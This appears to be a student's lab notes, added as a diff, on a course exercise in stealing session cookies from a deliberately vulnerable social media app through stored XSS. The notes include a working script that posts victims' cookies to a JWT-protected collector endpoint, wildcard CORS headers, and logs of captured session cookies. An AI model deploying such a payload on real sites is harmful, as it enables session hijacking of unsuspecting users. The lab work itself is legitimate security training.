@@ -1,0 +1,92 @@
+SOP, CORS etc..
+My first Idea was to user the JWT inside a cookie but this might complicate thing with CORS so im trying to use the Authorization header.
+
+
+
+In order to really understand what happened back in Submission 3 when we used Stored XSS to send it to your provided endpoint i checked the Headers and Payload of the request to the heroku app:
+
+Response Header:
+HTTP/1.1 200 OK
+Server: Cowboy
+Connection: keep-alive
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Date: Sat, 02 Apr 2022 13:00:42 GMT
+Content-Length: 0
+Via: 1.1 vegur
+
+Request Header:
+POST /store/156 HTTP/1.1
+Host: dva446.herokuapp.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
+Accept: */*
+Accept-Language: en-US,en;q=0.7,de;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 116
+Origin: https://localhost:8000
+Connection: keep-alive
+Referer: https://localhost:8000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+
+Payload:daniel:squeak-session=%7B%22sessionid%22%3A%22cc831bd909099a833ef4f399c4d3fcc2%22%2C%22username%22%3A%22daniel%22%7D
+_____________________________________________________
+
+After researching a little bit, I found out, that express has an jwt token library which im going to use because the signing process is pretty similar to the one with cookies.
+Im going to implement as requested but will let the user handle how he will make his requests and how to keep and implement the bearer token. This case they have all freedom and I can conzentrate on generating a rest like service.
+I used for testing the username "daniela" and got the bearertoken "eyJhbGciOiJIUzI1NiJ9.ZGFuaWVsYQ.kk2f21-d0nu01DWvciUX79gt89CX4lBKtUhBxuHwhbM". Inside the mozilla extension "rested" I added the authorization header and sent 
+them to the according path. Everything worked fine and when I tried to send to a not allowed path or with an tampered token i got my 403 response.
+
+In order to get the saved results I called "https://localhost:8001/store/daniela" with a post request and added:
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.ZGFuaWVsYQ.kk2f21-d0nu01DWvciUX79gt89CX4lBKtUhBxuHwhbM to be authenticated
+
+For the endpoint test I inserted in the unpatched Version of Our Social Media app the Squeak:
+
+"<script>
+var xhttp = new XMLHttpRequest();
+console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
+ xhttp.open("POST", "https://localhost:8001/store/daniela", true);
+ xhttp.setRequestHeader("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.ZGFuaWVsYQ.kk2f21-d0nu01DWvciUX79gt89CX4lBKtUhBxuHwhbM");
+ var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
+ xhttp.send(username+":"+document.cookie);
+</script>"
+
+ and "squeaked" it.
+ 
+ On the Rest server i've set the following headers:
+  res.setHeader("Access-Control-Allow-Origin","*");
+    res.setHeader("Access-Control-Request-Method", "POST");
+    res.setHeader("Access-Control-Request-Headers", "X-PINGOTHER, Content-Type, authorization");
+    res.setHeader("Access-Control-Allow-Headers", "X-PINGOTHER, Content-Type, authorization");
+    
+Every time a new user logged in his/her cookie data were sent to my endpoint and I could later get them with a get request (with included bearer token) to "https://localhost:8001/store/daniela".
+Everything worked as planned.
+
+This is for example the result from one of these GET requests:
+
+lör 23:37
+H. Curry:squeak-session=%7B%22sessionid%22%3A%22b23ca0c63ebaf786fb77f3c5f8b0957c%22%2C%22username%22%3A%22H.%20Curry%22%7D
+
+lör 23:23
+A. Church:squeak-session=%7B%22sessionid%22%3A%2294dbed8c734943e4313f264650163b3f%22%2C%22username%22%3A%22A.%20Church%22%7D
+
+lör 23:22
+daniel:squeak-session=%7B%22sessionid%22%3A%222b67b040fc63b00b5163f0e29dac56fa%22%2C%22username%22%3A%22daniel%22%7D
+
+lör 23:02
+{"test1":"test1"}
+
+lör 22:09
+{"test1":"test1"}
+
+lör 22:09
+{"test1":"test1"}
+
+lör 22:04
+{"test":"test"}
+
+
+
+I used some parts of my old code to generate the Server for the rest services.
